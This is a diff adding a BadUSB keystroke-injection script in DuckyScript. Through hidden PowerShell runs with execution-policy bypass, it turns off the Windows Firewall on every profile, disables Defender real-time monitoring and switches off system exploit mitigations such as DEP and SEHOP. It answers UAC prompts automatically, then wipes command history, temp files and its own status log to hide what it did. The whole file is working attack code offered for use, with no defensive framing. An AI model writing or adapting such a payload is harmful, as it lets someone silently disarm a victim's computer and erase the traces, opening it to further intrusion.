@@ -1,0 +1,59 @@
+# Disable Windows security features with validation
+# Requires admin privileges and English OS
+
+# Initial delay to ensure system is ready
+DELAY 3000
+
+# ----- Disable Windows Firewall -----
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass -C 
+STRING "if((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){"
+STRING "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;"
+STRING "echo '[+] Firewall Disabled' > C:\\Users\\Public\\status.log"
+STRING "}else{echo '[!] Admin Required' > C:\\Users\\Public\\status.log}"
+ENTER
+DELAY 2000
+ALT y
+DELAY 3000
+
+# Verify firewall disabled
+GUI r
+DELAY 500
+STRING powershell -c "if((Get-NetFirewallProfile | Where-Object {$_.Enabled -eq 'True'}).count -eq 0){echo '[+] Firewall Confirmed' >> C:\\Users\\Public\\status.log}"
+ENTER
+DELAY 2000
+
+# ----- Disable Windows Defender -----
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass -C 
+STRING "Start-Process powershell -Verb RunAs -ArgumentList '-w h -NoP -Ep Bypass -C Set-MpPreference -DisableRealtimeMonitoring $true'"
+ENTER
+DELAY 2000
+ALT y
+DELAY 3000
+
+# Verify Defender disabled
+GUI r
+DELAY 500
+STRING powershell -c "if((Get-MpPreference).DisableRealtimeMonitoring -eq $true){echo '[+] Defender Disabled' >> C:\\Users\\Public\\status.log}"
+ENTER
+DELAY 2000
+
+# ----- Disable Exploitation Protection -----
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass -C 
+STRING "Start-Process powershell -Verb RunAs -ArgumentList '-w h -NoP -Ep Bypass -C Set-ProcessMitigation -System -Disable DEP,SEHOP,Terminate,ExtensionPoint'"
+ENTER
+DELAY 2000
+ALT y
+DELAY 3000
+
+# Clear all traces
+GUI r
+DELAY 500
+STRING cmd /c "doskey /listsize=0 >nul & doskey /reinstall >nul & del /f /q %TEMP%\\* & del /f /q C:\\Users\\Public\\status.log"
+ENTER
+DELAY 1000
